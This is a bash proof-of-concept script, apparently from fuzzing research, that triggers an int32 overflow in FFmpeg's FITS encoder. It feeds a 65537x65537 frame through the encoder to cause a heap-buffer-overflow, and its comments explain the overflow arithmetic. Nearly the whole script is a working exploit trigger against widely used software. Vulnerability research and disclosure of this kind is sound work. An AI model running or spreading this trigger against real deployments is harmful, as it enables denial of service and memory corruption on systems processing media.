#!/bin/bash
# PoC runner for FITS encoder int32 overflow (fitsenc.c line 80)
set -euo pipefail
cd "$(dirname "$0")"
BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

echo "[*] Generating FITS input files..."
python3 vuln_001_gen.py

echo ""
echo "=== Attempt 1: Truncated FITS file (65537x65537 GRAY8) ==="
echo "    Tests whether decoder accepts truncated file"
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_attempt1.log" \
  timeout 30 "$BIN" -loglevel warning \
  -i vuln_001_input.fits \
  -c:v fits -f fits vuln_001_output1.fits \
  > attempt1_stderr.txt 2>&1 || true
echo "[*] Attempt 1 output:"
cat attempt1_stderr.txt
if ls asan_attempt1.log.* 2>/dev/null | head -1 | grep -q .; then
    echo "[!] ASAN output (attempt 1):"
    cat asan_attempt1.log.*
fi

echo ""
echo "=== Attempt 2: lavfi color source -> FITS encoder (GRAY8, 65537x65537) ==="
echo "    Bypasses decoder; creates frame synthetically to directly hit the encoder"
echo "    Expected: encoder computes 1*65537*65537=4295098369 -> int32 overflow -> 131073"
echo "    Then allocates ~132KB but writes ~4.3GB -> heap-buffer-overflow"
# Use lavfi color source to synthesize the frame; convert to gray for GRAY8 path
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_attempt2.log" \
  timeout 120 "$BIN" -loglevel warning \
  -f lavfi -i "color=color=black:size=65537x65537:rate=1" \
  -vframes 1 \
  -pix_fmt gray \
  -c:v fits -f fits vuln_001_output2.fits \
  > attempt2_stderr.txt 2>&1 || true
echo "[*] Attempt 2 output:"
cat attempt2_stderr.txt
if ls asan_attempt2.log.* 2>/dev/null | head -1 | grep -q .; then
    echo "[!] ASAN output (attempt 2):"
    cat asan_attempt2.log.*
fi

echo ""
echo "=== Attempt 3: lavfi color source -> FITS encoder (GBRP, 65537x65537) ==="
echo "    GBRP: naxis3=3, encoder computes 1*65537*65537*3=12885295107 -> int32 overflow -> 393219"
echo "    Allocates ~394KB but writes ~12.9GB -> heap-buffer-overflow"
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_attempt3.log" \
  timeout 120 "$BIN" -loglevel warning \
  -f lavfi -i "color=color=black:size=65537x65537:rate=1" \
  -vframes 1 \
  -pix_fmt gbrp \
  -c:v fits -f fits vuln_001_output3.fits \
  > attempt3_stderr.txt 2>&1 || true
echo "[*] Attempt 3 output:"
cat attempt3_stderr.txt
if ls asan_attempt3.log.* 2>/dev/null | head -1 | grep -q .; then
    echo "[!] ASAN output (attempt 3):"
    cat asan_attempt3.log.*
fi

echo ""
echo "[*] Done."
